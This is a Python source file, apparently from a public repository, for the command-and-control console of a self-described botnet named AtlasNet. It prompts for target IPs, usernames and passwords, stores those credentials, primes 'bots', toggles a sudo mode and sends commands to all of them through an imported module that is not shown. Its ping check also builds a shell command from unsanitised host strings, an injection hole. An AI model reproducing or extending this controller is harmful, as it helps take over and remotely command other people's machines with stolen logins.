#!/usr/bin/python3
#title           :command.py
#description     :Command and control for bots
#author          :atl4s
#date            :4/26/20
#version         :0.1
#usage           :python command.py  OR  ./command.py
#python_version  :3.6.9   
#==============================================================================

import botnet
import os
import sys
import time
import random

class ComSwitch:

	# this method passes in the input and concatenates that to case_[input]
	def switch(self, input):
		default = "Invalid input"
		return getattr(self, 'case_' + str(input), lambda: default)()

	# start session with initialized bots
	def case_command(self):
		print("--> You are now controlling the following bots:")
		for bot in botnet.runningbots:
			print("--> {*} Bot %s" % bot.user + "@" + bot.host + " - [" + bot.ops + "]")
		botnet.command_all()

	# adds a bot to the repository
	def case_add(self):	
		count = 0
		hosts = []
		for h in botnet.botnet:
			hosts.append(h.host)
		print("--> Target IP: ") 
		ip = input("-> ");
		if ip not in hosts:
			print("--> {^} Target IP:%s" % ip)
			print("--> Username: ")
			un = input("-> ");
			print("--> {^} Target Username:%s" % un)
			print("--> Password: ")
			passw = input("-> ");
			print("--> {^} Target Password:%s" % passw)
			print("--> Operating System: ")
			print("--> 1. Windows\n--> 2. Linux\n--> 3. Mac")
			opsin = input("-> ");
			if opsin == "1":
				ops = "Windows"
			elif opsin == "2":
				ops = "Linux"
			elif opsin == "3":
				ops = "Mac"
			else:
				ops = "null"
			if ops != "null": 
				print("--> {^} Target Operating System:%s" % ops)
				print("--> Adding bot...")
				botnet.add_bot(ip, un, passw, ops)
				print("--> {*} Bot %s" % un + "@" + ip + " - [" + ops + "] added.")
				print("--> Would you like to save this bot?")
				c = input("-> ");
				if "yes" == c:
					print("--> Saving bot...")
					botnet.save_bot(ip, un, passw, ops)
			else:
				print("--> That is not a valid system...")
		else:
			print("--> A bot with this address already exists...")

	# remove bot from repository
	def case_rm(self):
		print("-->Bot Username:")
		uin = input("-> ")
		count = 0
		for n in botnet.botnet:
			if n.user == uin:
				botnet.rm_bot(n)

	# remove all bots from repository
	def case_rmall(self):
		print("--> Are you sure? All bots will be removed from memory as well.")
		uin = input("-> ")
		if uin == "yes":
			print("--> Removing bots...")
			botnet.rmall_bot()
		else:
			pass

	# initialize bot 
	def case_set(self):
		valid = False
		print("-->Bot Username:")
		uin = input("-> ")
		count = 0
		for n in botnet.botnet:
			if n.user == uin:
				valid = True
				botnet.set_bot(n.host, n.user, n.password, n.ops)
				print("--> {*} Bot %s" % n.user + "@" + n.host + " - [" + n.ops + "] set.")
			else:
				continue
		if valid == False:
			print("--> Invalid input.")

	# intialize all bots in repository
	def case_setall(self):
		count = 0
		botnet.setall_bot()
		print("--> Bots primed: ")
		for n in botnet.runningbots:
			count += 1
			print("" + str(count) + ". " + n.user + "@" + n.host + " - [" + n.ops + "]")

	# unitializes bot 
	def case_rmset(self):
		print("--> --Bot Username:")
		uin = input("-> ")
		count = 0
		for n in botnet.runningbots:
			if n.user == uin:
				botnet.rmset_bot(n)
		print("--> Bots primed: ")
		for n in botnet.runningbots:
			count += 1
			print("" + str(count) + ". " + n.user + "@" + n.host + " - [" + n.ops + "]")

	# unitializes all bots 
	def case_rmsetall(self):
			print("--> Removing set bots...")
			botnet.rmsetall_bot()

	# print all intialized bots
	def case_print(self):
		print("--> Bots initialized: ")
		count = 0 
		for n in botnet.runningbots:
			count += 1
			print("" + str(count) + ". " + n.user + "@" + n.host + " - [" + n.ops + "]")

	# show help screen
	def case_help(self):
		uin = ""
		while(uin != "q"):
			os.system('clear')
			os.system('cat help.txt')
			uin = input(":")
		header()

	# switch to sudo mode
	def case_sudo(self):
		if botnet.sudo == False:
			botnet.sudo = True
		elif botnet.sudo == True:
			botnet.sudo = False
		print("--> Sudo Mode: " + str(botnet.sudo))
			
	# clear screan and refresh header
	def case_clear(self):
		os.system('clear')
		header()

	# exit from program 
	def case_exit(self):
		sys.exit(0)
		os._exit(0)

	# handling empty input 
	def case_(self):
		pass

# ping hosts to verify status
def ping_check(host):
	r = os.system("ping -c 1 -i .2 -w 1 " + host + ">/dev/null")
	if r == 0:
		stat = True
	else:
		stat = False
	return stat

# main header 
def header():
	count = 0
	os.system('clear')
	print("=" * 100)
	os.system('cat title.txt')
	print("\nAtlasNet - a multipurpose botnet - by atl4s")
	print("=" * 100)
	print("\nWelcome to AtlasNet. You currently have " + str(len(botnet.botnet)) + " Bot(s).")
	if len(botnet.botnet) > 0:
		print("Please wait while ping tests run...")
	print("\n\n")
	hstring = "   {:<20}".format("Username") + "{:<25}".format("IP") + "{:<15}".format("System") + "Active"
	print(hstring)
	print("-" * 80)
	for n in botnet.botnet:
		count += 1
		if ping_check(n.host):
			s = "*"
		else:
			s = " "
		string = str(count) + ". " + "{:<20}".format(str(n.user)) + "{:<25}".format(str(n.host)) + "{:<15}".format(str(n.ops)) + "[%s]" % s
		print(string)
	print("-" * 80)
	print("\n\n--> For HELP use help or h\n")
	print("--> https://github.com/atlas64 for other projects\n")
	print("=" * 100)


# prints a load bar as the bots are being set up.
def load_bar():
	if os.path.isfile('./bots.txt'):
		for i in range(100):
			time.sleep(random.uniform(.05, .08))
			print('Loading in bots... [%d%%]\r'%i, end="")

def main():
	botnet.pull_bot()
	load_bar()
	global amount_of_bots
	c = ComSwitch()
	header()
	while(True):
		uin = input("-> ");
		c.switch(uin)

try:
	main()
except KeyboardInterrupt:
	print("\nEnding Atlasnet...\n")	
	exit()